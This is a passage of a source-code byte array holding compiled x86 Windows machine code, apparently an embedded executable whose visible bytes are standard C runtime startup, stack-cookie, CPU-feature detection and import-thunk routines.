0x59, 0x59, 0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0x8B, 0xC6, 0xEB,
0x35, 0x8B, 0x4D, 0xEC, 0x8B, 0x01, 0x8B, 0x00, 0x89, 0x45, 0xE0, 0x51,
0x50, 0xE8, 0x7B, 0x09, 0x00, 0x00, 0x59, 0x59, 0xC3, 0x8B, 0x65, 0xE8,
0xE8, 0xF5, 0x05, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x32, 0x80, 0x7D, 0xE7,
0x00, 0x75, 0x05, 0xE8, 0xB5, 0x09, 0x00, 0x00, 0xC7, 0x45, 0xFC, 0xFE,
0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0xE0, 0x8B, 0x4D, 0xF0, 0x64, 0x89, 0x0D,
0x00, 0x00, 0x00, 0x00, 0x59, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x6A, 0x07,
0xE8, 0xA5, 0x04, 0x00, 0x00, 0x56, 0xE8, 0x6A, 0x09, 0x00, 0x00, 0xFF,
0x75, 0xE0, 0xE8, 0x68, 0x09, 0x00, 0x00, 0xCC, 0xE8, 0xC5, 0x03, 0x00,
0x00, 0xE9, 0x74, 0xFE, 0xFF, 0xFF, 0x55, 0x8B, 0xEC, 0x6A, 0x00, 0xFF,
0x15, 0x50, 0x20, 0x40, 0x00, 0xFF, 0x75, 0x08, 0xFF, 0x15, 0x54, 0x20,
0x40, 0x00, 0x68, 0x09, 0x04, 0x00, 0xC0, 0xFF, 0x15, 0x4C, 0x20, 0x40,
0x00, 0x50, 0xFF, 0x15, 0x38, 0x20, 0x40, 0x00, 0x5D, 0xC3, 0x55, 0x8B,
0xEC, 0x81, 0xEC, 0x24, 0x03, 0x00, 0x00, 0x6A, 0x17, 0xFF, 0x15, 0x34,
0x20, 0x40, 0x00, 0x85, 0xC0, 0x74, 0x05, 0x6A, 0x02, 0x59, 0xCD, 0x29,
0xA3, 0x18, 0x31, 0x40, 0x00, 0x89, 0x0D, 0x14, 0x31, 0x40, 0x00, 0x89,
0x15, 0x10, 0x31, 0x40, 0x00, 0x89, 0x1D, 0x0C, 0x31, 0x40, 0x00, 0x89,
0x35, 0x08, 0x31, 0x40, 0x00, 0x89, 0x3D, 0x04, 0x31, 0x40, 0x00, 0x66,
0x8C, 0x15, 0x30, 0x31, 0x40, 0x00, 0x66, 0x8C, 0x0D, 0x24, 0x31, 0x40,
0x00, 0x66, 0x8C, 0x1D, 0x00, 0x31, 0x40, 0x00, 0x66, 0x8C, 0x05, 0xFC,
0x30, 0x40, 0x00, 0x66, 0x8C, 0x25, 0xF8, 0x30, 0x40, 0x00, 0x66, 0x8C,
0x2D, 0xF4, 0x30, 0x40, 0x00, 0x9C, 0x8F, 0x05, 0x28, 0x31, 0x40, 0x00,
0x8B, 0x45, 0x00, 0xA3, 0x1C, 0x31, 0x40, 0x00, 0x8B, 0x45, 0x04, 0xA3,
0x20, 0x31, 0x40, 0x00, 0x8D, 0x45, 0x08, 0xA3, 0x2C, 0x31, 0x40, 0x00,
0x8B, 0x85, 0xDC, 0xFC, 0xFF, 0xFF, 0xC7, 0x05, 0x68, 0x30, 0x40, 0x00,
0x01, 0x00, 0x01, 0x00, 0xA1, 0x20, 0x31, 0x40, 0x00, 0xA3, 0x24, 0x30,
0x40, 0x00, 0xC7, 0x05, 0x18, 0x30, 0x40, 0x00, 0x09, 0x04, 0x00, 0xC0,
0xC7, 0x05, 0x1C, 0x30, 0x40, 0x00, 0x01, 0x00, 0x00, 0x00, 0xC7, 0x05,
0x28, 0x30, 0x40, 0x00, 0x01, 0x00, 0x00, 0x00, 0x6A, 0x04, 0x58, 0x6B,
0xC0, 0x00, 0xC7, 0x80, 0x2C, 0x30, 0x40, 0x00, 0x02, 0x00, 0x00, 0x00,
0x6A, 0x04, 0x58, 0x6B, 0xC0, 0x00, 0x8B, 0x0D, 0x04, 0x30, 0x40, 0x00,
0x89, 0x4C, 0x05, 0xF8, 0x6A, 0x04, 0x58, 0xC1, 0xE0, 0x00, 0x8B, 0x0D,
0x00, 0x30, 0x40, 0x00, 0x89, 0x4C, 0x05, 0xF8, 0x68, 0x38, 0x21, 0x40,
0x00, 0xE8, 0xE0, 0xFE, 0xFF, 0xFF, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x8B,
0x45, 0x08, 0x56, 0x8B, 0x48, 0x3C, 0x03, 0xC8, 0x0F, 0xB7, 0x41, 0x14,
0x8D, 0x51, 0x18, 0x03, 0xD0, 0x0F, 0xB7, 0x41, 0x06, 0x6B, 0xF0, 0x28,
0x03, 0xF2, 0x3B, 0xD6, 0x74, 0x19, 0x8B, 0x4D, 0x0C, 0x3B, 0x4A, 0x0C,
0x72, 0x0A, 0x8B, 0x42, 0x08, 0x03, 0x42, 0x0C, 0x3B, 0xC8, 0x72, 0x0C,
0x83, 0xC2, 0x28, 0x3B, 0xD6, 0x75, 0xEA, 0x33, 0xC0, 0x5E, 0x5D, 0xC3,
0x8B, 0xC2, 0xEB, 0xF9, 0x56, 0xE8, 0x97, 0x07, 0x00, 0x00, 0x85, 0xC0,
0x74, 0x20, 0x64, 0xA1, 0x18, 0x00, 0x00, 0x00, 0xBE, 0x38, 0x33, 0x40,
0x00, 0x8B, 0x50, 0x04, 0xEB, 0x04, 0x3B, 0xD0, 0x74, 0x10, 0x33, 0xC0,
0x8B, 0xCA, 0xF0, 0x0F, 0xB1, 0x0E, 0x85, 0xC0, 0x75, 0xF0, 0x32, 0xC0,
0x5E, 0xC3, 0xB0, 0x01, 0x5E, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0x7D, 0x08,
0x00, 0x75, 0x07, 0xC6, 0x05, 0x3C, 0x33, 0x40, 0x00, 0x01, 0xE8, 0x85,
0x05, 0x00, 0x00, 0xE8, 0x72, 0x02, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x04,
0x32, 0xC0, 0x5D, 0xC3, 0xE8, 0x65, 0x02, 0x00, 0x00, 0x84, 0xC0, 0x75,
0x0A, 0x6A, 0x00, 0xE8, 0x5A, 0x02, 0x00, 0x00, 0x59, 0xEB, 0xE9, 0xB0,
0x01, 0x5D, 0xC3, 0x55, 0x8B, 0xEC, 0x80, 0x3D, 0x3D, 0x33, 0x40, 0x00,
0x00, 0x74, 0x04, 0xB0, 0x01, 0x5D, 0xC3, 0x56, 0x8B, 0x75, 0x08, 0x85,
0xF6, 0x74, 0x05, 0x83, 0xFE, 0x01, 0x75, 0x62, 0xE8, 0x10, 0x07, 0x00,
0x00, 0x85, 0xC0, 0x74, 0x26, 0x85, 0xF6, 0x75, 0x22, 0x68, 0x40, 0x33,
0x40, 0x00, 0xE8, 0x94, 0x07, 0x00, 0x00, 0x59, 0x85, 0xC0, 0x75, 0x0F,
0x68, 0x4C, 0x33, 0x40, 0x00, 0xE8, 0x85, 0x07, 0x00, 0x00, 0x59, 0x85,
0xC0, 0x74, 0x2B, 0x32, 0xC0, 0xEB, 0x30, 0x83, 0xC9, 0xFF, 0x89, 0x0D,
0x40, 0x33, 0x40, 0x00, 0x89, 0x0D, 0x44, 0x33, 0x40, 0x00, 0x89, 0x0D,
0x48, 0x33, 0x40, 0x00, 0x89, 0x0D, 0x4C, 0x33, 0x40, 0x00, 0x89, 0x0D,
0x50, 0x33, 0x40, 0x00, 0x89, 0x0D, 0x54, 0x33, 0x40, 0x00, 0xC6, 0x05,
0x3D, 0x33, 0x40, 0x00, 0x01, 0xB0, 0x01, 0x5E, 0x5D, 0xC3, 0x6A, 0x05,
0xE8, 0x35, 0x02, 0x00, 0x00, 0xCC, 0x6A, 0x08, 0x68, 0x78, 0x26, 0x40,
0x00, 0xE8, 0x5A, 0x04, 0x00, 0x00, 0x83, 0x65, 0xFC, 0x00, 0xB8, 0x4D,
0x5A, 0x00, 0x00, 0x66, 0x39, 0x05, 0x00, 0x00, 0x40, 0x00, 0x75, 0x5D,
0xA1, 0x3C, 0x00, 0x40, 0x00, 0x81, 0xB8, 0x00, 0x00, 0x40, 0x00, 0x50,
0x45, 0x00, 0x00, 0x75, 0x4C, 0xB9, 0x0B, 0x01, 0x00, 0x00, 0x66, 0x39,
0x88, 0x18, 0x00, 0x40, 0x00, 0x75, 0x3E, 0x8B, 0x45, 0x08, 0xB9, 0x00,
0x00, 0x40, 0x00, 0x2B, 0xC1, 0x50, 0x51, 0xE8, 0x7C, 0xFE, 0xFF, 0xFF,
0x59, 0x59, 0x85, 0xC0, 0x74, 0x27, 0x83, 0x78, 0x24, 0x00, 0x7C, 0x21,
0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xB0, 0x01, 0xEB, 0x1F, 0x8B,
0x45, 0xEC, 0x8B, 0x00, 0x33, 0xC9, 0x81, 0x38, 0x05, 0x00, 0x00, 0xC0,
0x0F, 0x94, 0xC1, 0x8B, 0xC1, 0xC3, 0x8B, 0x65, 0xE8, 0xC7, 0x45, 0xFC,
0xFE, 0xFF, 0xFF, 0xFF, 0x32, 0xC0, 0x8B, 0x4D, 0xF0, 0x64, 0x89, 0x0D,
0x00, 0x00, 0x00, 0x00, 0x59, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x55, 0x8B,
0xEC, 0xE8, 0x0F, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x0F, 0x80, 0x7D,
0x08, 0x00, 0x75, 0x09, 0x33, 0xC0, 0xB9, 0x38, 0x33, 0x40, 0x00, 0x87,
0x01, 0x5D, 0xC3, 0x55, 0x8B, 0xEC, 0x80, 0x3D, 0x3C, 0x33, 0x40, 0x00,
0x00, 0x74, 0x06, 0x80, 0x7D, 0x0C, 0x00, 0x75, 0x12, 0xFF, 0x75, 0x08,
0xE8, 0x01, 0x01, 0x00, 0x00, 0xFF, 0x75, 0x08, 0xE8, 0xF9, 0x00, 0x00,
0x00, 0x59, 0x59, 0xB0, 0x01, 0x5D, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0x3D,
0x40, 0x33, 0x40, 0x00, 0xFF, 0xFF, 0x75, 0x08, 0x75, 0x07, 0xE8, 0x60,
0x06, 0x00, 0x00, 0xEB, 0x0B, 0x68, 0x40, 0x33, 0x40, 0x00, 0xE8, 0x4E,
0x06, 0x00, 0x00, 0x59, 0xF7, 0xD8, 0x59, 0x1B, 0xC0, 0xF7, 0xD0, 0x23,
0x45, 0x08, 0x5D, 0xC3, 0x55, 0x8B, 0xEC, 0xFF, 0x75, 0x08, 0xE8, 0xC8,
0xFF, 0xFF, 0xFF, 0xF7, 0xD8, 0x59, 0x1B, 0xC0, 0xF7, 0xD8, 0x48, 0x5D,
0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x83, 0x65, 0xF4, 0x00, 0x8D,
0x45, 0xF4, 0x83, 0x65, 0xF8, 0x00, 0x50, 0xFF, 0x15, 0x28, 0x20, 0x40,
0x00, 0x8B, 0x45, 0xF8, 0x33, 0x45, 0xF4, 0x89, 0x45, 0xFC, 0xFF, 0x15,
0x44, 0x20, 0x40, 0x00, 0x31, 0x45, 0xFC, 0xFF, 0x15, 0x2C, 0x20, 0x40,
0x00, 0x31, 0x45, 0xFC, 0x8D, 0x45, 0xEC, 0x50, 0xFF, 0x15, 0x30, 0x20,
0x40, 0x00, 0x8B, 0x45, 0xF0, 0x8D, 0x4D, 0xFC, 0x33, 0x45, 0xEC, 0x33,
0x45, 0xFC, 0x33, 0xC1, 0xC9, 0xC3, 0x8B, 0x0D, 0x04, 0x30, 0x40, 0x00,
0x56, 0x57, 0xBF, 0x4E, 0xE6, 0x40, 0xBB, 0xBE, 0x00, 0x00, 0xFF, 0xFF,
0x3B, 0xCF, 0x74, 0x04, 0x85, 0xCE, 0x75, 0x26, 0xE8, 0x94, 0xFF, 0xFF,
0xFF, 0x8B, 0xC8, 0x3B, 0xCF, 0x75, 0x07, 0xB9, 0x4F, 0xE6, 0x40, 0xBB,
0xEB, 0x0E, 0x85, 0xCE, 0x75, 0x0A, 0x0D, 0x11, 0x47, 0x00, 0x00, 0xC1,
0xE0, 0x10, 0x0B, 0xC8, 0x89, 0x0D, 0x04, 0x30, 0x40, 0x00, 0xF7, 0xD1,
0x5F, 0x89, 0x0D, 0x00, 0x30, 0x40, 0x00, 0x5E, 0xC3, 0x33, 0xC0, 0xC3,
0x33, 0xC0, 0x40, 0xC3, 0xB8, 0x00, 0x40, 0x00, 0x00, 0xC3, 0x68, 0x58,
0x33, 0x40, 0x00, 0xFF, 0x15, 0x48, 0x20, 0x40, 0x00, 0xC3, 0xB0, 0x01,
0xC3, 0x68, 0x00, 0x00, 0x03, 0x00, 0x68, 0x00, 0x00, 0x01, 0x00, 0x6A,
0x00, 0xE8, 0x73, 0x05, 0x00, 0x00, 0x83, 0xC4, 0x0C, 0x85, 0xC0, 0x75,
0x01, 0xC3, 0x6A, 0x07, 0xE8, 0x45, 0x00, 0x00, 0x00, 0xCC, 0xC2, 0x00,
0x00, 0xB8, 0x60, 0x33, 0x40, 0x00, 0xC3, 0xB8, 0x68, 0x33, 0x40, 0x00,
0xC3, 0xE8, 0xEF, 0xFF, 0xFF, 0xFF, 0x8B, 0x48, 0x04, 0x83, 0x08, 0x24,
0x89, 0x48, 0x04, 0xE8, 0xE7, 0xFF, 0xFF, 0xFF, 0x8B, 0x48, 0x04, 0x83,
0x08, 0x02, 0x89, 0x48, 0x04, 0xC3, 0x33, 0xC0, 0x39, 0x05, 0x0C, 0x30,
0x40, 0x00, 0x0F, 0x94, 0xC0, 0xC3, 0xB8, 0x90, 0x33, 0x40, 0x00, 0xC3,
0xB8, 0x8C, 0x33, 0x40, 0x00, 0xC3, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x24,
0x03, 0x00, 0x00, 0x53, 0x6A, 0x17, 0xFF, 0x15, 0x34, 0x20, 0x40, 0x00,
0x85, 0xC0, 0x74, 0x05, 0x8B, 0x4D, 0x08, 0xCD, 0x29, 0x6A, 0x03, 0xE8,
0xA3, 0x01, 0x00, 0x00, 0xC7, 0x04, 0x24, 0xCC, 0x02, 0x00, 0x00, 0x8D,
0x85, 0xDC, 0xFC, 0xFF, 0xFF, 0x6A, 0x00, 0x50, 0xE8, 0x58, 0x04, 0x00,
0x00, 0x83, 0xC4, 0x0C, 0x89, 0x85, 0x8C, 0xFD, 0xFF, 0xFF, 0x89, 0x8D,
0x88, 0xFD, 0xFF, 0xFF, 0x89, 0x95, 0x84, 0xFD, 0xFF, 0xFF, 0x89, 0x9D,
0x80, 0xFD, 0xFF, 0xFF, 0x89, 0xB5, 0x7C, 0xFD, 0xFF, 0xFF, 0x89, 0xBD,
0x78, 0xFD, 0xFF, 0xFF, 0x66, 0x8C, 0x95, 0xA4, 0xFD, 0xFF, 0xFF, 0x66,
0x8C, 0x8D, 0x98, 0xFD, 0xFF, 0xFF, 0x66, 0x8C, 0x9D, 0x74, 0xFD, 0xFF,
0xFF, 0x66, 0x8C, 0x85, 0x70, 0xFD, 0xFF, 0xFF, 0x66, 0x8C, 0xA5, 0x6C,
0xFD, 0xFF, 0xFF, 0x66, 0x8C, 0xAD, 0x68, 0xFD, 0xFF, 0xFF, 0x9C, 0x8F,
0x85, 0x9C, 0xFD, 0xFF, 0xFF, 0x8B, 0x45, 0x04, 0x89, 0x85, 0x94, 0xFD,
0xFF, 0xFF, 0x8D, 0x45, 0x04, 0x89, 0x85, 0xA0, 0xFD, 0xFF, 0xFF, 0xC7,
0x85, 0xDC, 0xFC, 0xFF, 0xFF, 0x01, 0x00, 0x01, 0x00, 0x8B, 0x40, 0xFC,
0x6A, 0x50, 0x89, 0x85, 0x90, 0xFD, 0xFF, 0xFF, 0x8D, 0x45, 0xA8, 0x6A,
0x00, 0x50, 0xE8, 0xCE, 0x03, 0x00, 0x00, 0x8B, 0x45, 0x04, 0x83, 0xC4,
0x0C, 0xC7, 0x45, 0xA8, 0x15, 0x00, 0x00, 0x40, 0xC7, 0x45, 0xAC, 0x01,
0x00, 0x00, 0x00, 0x89, 0x45, 0xB4, 0xFF, 0x15, 0x20, 0x20, 0x40, 0x00,
0x6A, 0x00, 0x8D, 0x58, 0xFF, 0xF7, 0xDB, 0x8D, 0x45, 0xA8, 0x89, 0x45,
0xF8, 0x8D, 0x85, 0xDC, 0xFC, 0xFF, 0xFF, 0x1A, 0xDB, 0x89, 0x45, 0xFC,
0xFE, 0xC3, 0xFF, 0x15, 0x50, 0x20, 0x40, 0x00, 0x8D, 0x45, 0xF8, 0x50,
0xFF, 0x15, 0x54, 0x20, 0x40, 0x00, 0x85, 0xC0, 0x75, 0x0C, 0x84, 0xDB,
0x75, 0x08, 0x6A, 0x03, 0xE8, 0xAE, 0x00, 0x00, 0x00, 0x59, 0x5B, 0xC9,
0xC3, 0xE9, 0x5F, 0xFE, 0xFF, 0xFF, 0x6A, 0x00, 0xFF, 0x15, 0x58, 0x20,
0x40, 0x00, 0x85, 0xC0, 0x74, 0x34, 0xB9, 0x4D, 0x5A, 0x00, 0x00, 0x66,
0x39, 0x08, 0x75, 0x2A, 0x8B, 0x48, 0x3C, 0x03, 0xC8, 0x81, 0x39, 0x50,
0x45, 0x00, 0x00, 0x75, 0x1D, 0xB8, 0x0B, 0x01, 0x00, 0x00, 0x66, 0x39,
0x41, 0x18, 0x75, 0x12, 0x83, 0x79, 0x74, 0x0E, 0x76, 0x0C, 0x83, 0xB9,
0xE8, 0x00, 0x00, 0x00, 0x00, 0x74, 0x03, 0xB0, 0x01, 0xC3, 0x32, 0xC0,
0xC3, 0x68, 0x0D, 0x1B, 0x40, 0x00, 0xFF, 0x15, 0x50, 0x20, 0x40, 0x00,
0xC3, 0x55, 0x8B, 0xEC, 0x56, 0x57, 0x8B, 0x7D, 0x08, 0x8B, 0x37, 0x81,
0x3E, 0x63, 0x73, 0x6D, 0xE0, 0x75, 0x25, 0x83, 0x7E, 0x10, 0x03, 0x75,
0x1F, 0x8B, 0x46, 0x14, 0x3D, 0x20, 0x05, 0x93, 0x19, 0x74, 0x1D, 0x3D,
0x21, 0x05, 0x93, 0x19, 0x74, 0x16, 0x3D, 0x22, 0x05, 0x93, 0x19, 0x74,
0x0F, 0x3D, 0x00, 0x40, 0x99, 0x01, 0x74, 0x08, 0x5F, 0x33, 0xC0, 0x5E,
0x5D, 0xC2, 0x04, 0x00, 0xE8, 0xD0, 0x02, 0x00, 0x00, 0x89, 0x30, 0x8B,
0x77, 0x04, 0xE8, 0xCC, 0x02, 0x00, 0x00, 0x89, 0x30, 0xE8, 0x61, 0x03,
0x00, 0x00, 0xCC, 0x83, 0x25, 0x70, 0x33, 0x40, 0x00, 0x00, 0xC3, 0x53,
0x56, 0xBE, 0x48, 0x26, 0x40, 0x00, 0xBB, 0x48, 0x26, 0x40, 0x00, 0x3B,
0xF3, 0x73, 0x19, 0x57, 0x8B, 0x3E, 0x85, 0xFF, 0x74, 0x0A, 0x8B, 0xCF,
0xFF, 0x15, 0x04, 0x21, 0x40, 0x00, 0xFF, 0xD7, 0x83, 0xC6, 0x04, 0x3B,
0xF3, 0x72, 0xE9, 0x5F, 0x5E, 0x5B, 0xC3, 0x53, 0x56, 0xBE, 0x50, 0x26,
0x40, 0x00, 0xBB, 0x50, 0x26, 0x40, 0x00, 0x3B, 0xF3, 0x73, 0x19, 0x57,
0x8B, 0x3E, 0x85, 0xFF, 0x74, 0x0A, 0x8B, 0xCF, 0xFF, 0x15, 0x04, 0x21,
0x40, 0x00, 0xFF, 0xD7, 0x83, 0xC6, 0x04, 0x3B, 0xF3, 0x72, 0xE9, 0x5F,
0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xCC, 0xCC, 0xCC, 0xCC, 0x68, 0x15, 0x1C, 0x40, 0x00, 0x64, 0xFF, 0x35,
0x00, 0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x10, 0x89, 0x6C, 0x24, 0x10,
0x8D, 0x6C, 0x24, 0x10, 0x2B, 0xE0, 0x53, 0x56, 0x57, 0xA1, 0x04, 0x30,
0x40, 0x00, 0x31, 0x45, 0xFC, 0x33, 0xC5, 0x50, 0x89, 0x65, 0xE8, 0xFF,
0x75, 0xF8, 0x8B, 0x45, 0xFC, 0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF,
0x89, 0x45, 0xF8, 0x8D, 0x45, 0xF0, 0x64, 0xA3, 0x00, 0x00, 0x00, 0x00,
0xC3, 0x55, 0x8B, 0xEC, 0x56, 0x8B, 0x75, 0x08, 0xFF, 0x36, 0xE8, 0xA6,
0x02, 0x00, 0x00, 0xFF, 0x75, 0x14, 0x89, 0x06, 0xFF, 0x75, 0x10, 0xFF,
0x75, 0x0C, 0x56, 0x68, 0xB3, 0x12, 0x40, 0x00, 0x68, 0x04, 0x30, 0x40,
0x00, 0xE8, 0xF5, 0x01, 0x00, 0x00, 0x83, 0xC4, 0x1C, 0x5E, 0x5D, 0xC3,
0x55, 0x8B, 0xEC, 0x83, 0x25, 0x78, 0x33, 0x40, 0x00, 0x00, 0x83, 0xEC,
0x24, 0x83, 0x0D, 0x10, 0x30, 0x40, 0x00, 0x01, 0x6A, 0x0A, 0xFF, 0x15,
0x34, 0x20, 0x40, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0xA9, 0x01, 0x00, 0x00,
0x83, 0x65, 0xF0, 0x00, 0x33, 0xC0, 0x53, 0x56, 0x57, 0x33, 0xC9, 0x8D,
0x7D, 0xDC, 0x53, 0x0F, 0xA2, 0x8B, 0xF3, 0x5B, 0x89, 0x07, 0x89, 0x77,
0x04, 0x89, 0x4F, 0x08, 0x33, 0xC9, 0x89, 0x57, 0x0C, 0x8B, 0x45, 0xDC,
0x8B, 0x7D, 0xE4, 0x89, 0x45, 0xF4, 0x81, 0xF7, 0x6E, 0x74, 0x65, 0x6C,
0x8B, 0x45, 0xE8, 0x35, 0x69, 0x6E, 0x65, 0x49, 0x89, 0x45, 0xF8, 0x8B,
0x45, 0xE0, 0x35, 0x47, 0x65, 0x6E, 0x75, 0x89, 0x45, 0xFC, 0x33, 0xC0,
0x40, 0x53, 0x0F, 0xA2, 0x8B, 0xF3, 0x5B, 0x8D, 0x5D, 0xDC, 0x89, 0x03,
0x8B, 0x45, 0xFC, 0x89, 0x73, 0x04, 0x0B, 0xC7, 0x0B, 0x45, 0xF8, 0x89,
0x4B, 0x08, 0x89, 0x53, 0x0C, 0x75, 0x43, 0x8B, 0x45, 0xDC, 0x25, 0xF0,
0x3F, 0xFF, 0x0F, 0x3D, 0xC0, 0x06, 0x01, 0x00, 0x74, 0x23, 0x3D, 0x60,
0x06, 0x02, 0x00, 0x74, 0x1C, 0x3D, 0x70, 0x06, 0x02, 0x00, 0x74, 0x15,
0x3D, 0x50, 0x06, 0x03, 0x00, 0x74, 0x0E, 0x3D, 0x60, 0x06, 0x03, 0x00,
0x74, 0x07, 0x3D, 0x70, 0x06, 0x03, 0x00, 0x75, 0x11, 0x8B, 0x3D, 0x7C,
0x33, 0x40, 0x00, 0x83, 0xCF, 0x01, 0x89, 0x3D, 0x7C, 0x33, 0x40, 0x00,
0xEB, 0x06, 0x8B, 0x3D, 0x7C, 0x33, 0x40, 0x00, 0x8B, 0x4D, 0xE4, 0x6A,
0x07, 0x58, 0x89, 0x4D, 0xFC, 0x39, 0x45, 0xF4, 0x7C, 0x2F, 0x33, 0xC9,
0x53, 0x0F, 0xA2, 0x8B, 0xF3, 0x5B, 0x8D, 0x5D, 0xDC, 0x89, 0x03, 0x89,
0x73, 0x04, 0x89, 0x4B, 0x08, 0x8B, 0x4D, 0xFC, 0x89, 0x53, 0x0C, 0x8B,
0x5D, 0xE0, 0xF7, 0xC3, 0x00, 0x02, 0x00, 0x00, 0x74, 0x0E, 0x83, 0xCF,
0x02, 0x89, 0x3D, 0x7C, 0x33, 0x40, 0x00, 0xEB, 0x03, 0x8B, 0x5D, 0xF0,
0xA1, 0x10, 0x30, 0x40, 0x00, 0x83, 0xC8, 0x02, 0xC7, 0x05, 0x78, 0x33,
0x40, 0x00, 0x01, 0x00, 0x00, 0x00, 0xA3, 0x10, 0x30, 0x40, 0x00, 0xF7,
0xC1, 0x00, 0x00, 0x10, 0x00, 0x0F, 0x84, 0x93, 0x00, 0x00, 0x00, 0x83,
0xC8, 0x04, 0xC7, 0x05, 0x78, 0x33, 0x40, 0x00, 0x02, 0x00, 0x00, 0x00,
0xA3, 0x10, 0x30, 0x40, 0x00, 0xF7, 0xC1, 0x00, 0x00, 0x00, 0x08, 0x74,
0x79, 0xF7, 0xC1, 0x00, 0x00, 0x00, 0x10, 0x74, 0x71, 0x33, 0xC9, 0x0F,
0x01, 0xD0, 0x89, 0x45, 0xEC, 0x89, 0x55, 0xF0, 0x8B, 0x45, 0xEC, 0x8B,
0x4D, 0xF0, 0x6A, 0x06, 0x5E, 0x23, 0xC6, 0x3B, 0xC6, 0x75, 0x57, 0xA1,
0x10, 0x30, 0x40, 0x00, 0x83, 0xC8, 0x08, 0xC7, 0x05, 0x78, 0x33, 0x40,
0x00, 0x03, 0x00, 0x00, 0x00, 0xA3, 0x10, 0x30, 0x40, 0x00, 0xF6, 0xC3,
0x20, 0x74, 0x3B, 0x83, 0xC8, 0x20, 0xC7, 0x05, 0x78, 0x33, 0x40, 0x00,
0x05, 0x00, 0x00, 0x00, 0xA3, 0x10, 0x30, 0x40, 0x00, 0xB8, 0x00, 0x00,
0x03, 0xD0, 0x23, 0xD8, 0x3B, 0xD8, 0x75, 0x1E, 0x8B, 0x45, 0xEC, 0xBA,
0xE0, 0x00, 0x00, 0x00, 0x8B, 0x4D, 0xF0, 0x23, 0xC2, 0x3B, 0xC2, 0x75,
0x0D, 0x83, 0x0D, 0x10, 0x30, 0x40, 0x00, 0x40, 0x89, 0x35, 0x78, 0x33,
0x40, 0x00, 0x5F, 0x5E, 0x5B, 0x33, 0xC0, 0xC9, 0xC3, 0x33, 0xC0, 0x39,
0x05, 0x14, 0x30, 0x40, 0x00, 0x0F, 0x95, 0xC0, 0xC3, 0xFF, 0x25, 0x88,
0x20, 0x40, 0x00, 0xFF, 0x25, 0x84, 0x20, 0x40, 0x00, 0xFF, 0x25, 0x80,
0x20, 0x40, 0x00, 0xFF, 0x25, 0x7C, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xE4,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xE0, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xA0,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xD8, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xD0,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xC8, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xAC,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xA8, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xF0,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xEC, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xF8,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xBC, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xDC,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xD4, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xB8,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xCC, 0x20, 0x40, 0x00, 0xFF, 0x25, 0x98,
0x20, 0x40, 0x00, 0xFF, 0x25, 0x90, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xFC,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xB0, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xB4,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xE8, 0x20, 0x40, 0x00, 0xFF, 0x25, 0xC0,
0x20, 0x40, 0x00, 0xFF, 0x25, 0xC4, 0x20, 0x40, 0x00, 0x55, 0x8B, 0xEC,
0x51, 0x83, 0x3D, 0x78, 0x33, 0x40, 0x00, 0x01, 0x7C, 0x66, 0x81, 0x7D,
0x08, 0xB4, 0x02, 0x00, 0xC0, 0x74, 0x09, 0x81, 0x7D, 0x08, 0xB5, 0x02,
0x00, 0xC0, 0x75, 0x54, 0x0F, 0xAE, 0x5D, 0xFC, 0x8B, 0x45, 0xFC, 0x83,
0xF0, 0x3F, 0xA8, 0x81, 0x74, 0x3F, 0xA9, 0x04, 0x02, 0x00, 0x00, 0x75,
0x07, 0xB8, 0x8E, 0x00, 0x00, 0xC0, 0xC9, 0xC3, 0xA9, 0x02, 0x01, 0x00,
0x00, 0x74, 0x2A, 0xA9, 0x08, 0x04, 0x00, 0x00, 0x75, 0x07, 0xB8, 0x91,
0x00, 0x00, 0xC0, 0xC9, 0xC3, 0xA9, 0x10, 0x08, 0x00, 0x00, 0x75, 0x07,
0xB8, 0x93, 0x00, 0x00, 0xC0, 0xC9, 0xC3, 0xA9, 0x20, 0x10, 0x00, 0x00,
0x75, 0x0E, 0xB8, 0x8F, 0x00, 0x00, 0xC0, 0xC9, 0xC3, 0xB8, 0x90, 0x00,
0x00, 0xC0, 0xC9, 0xC3, 0x8B, 0x45, 0x08, 0xC9, 0xC3, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
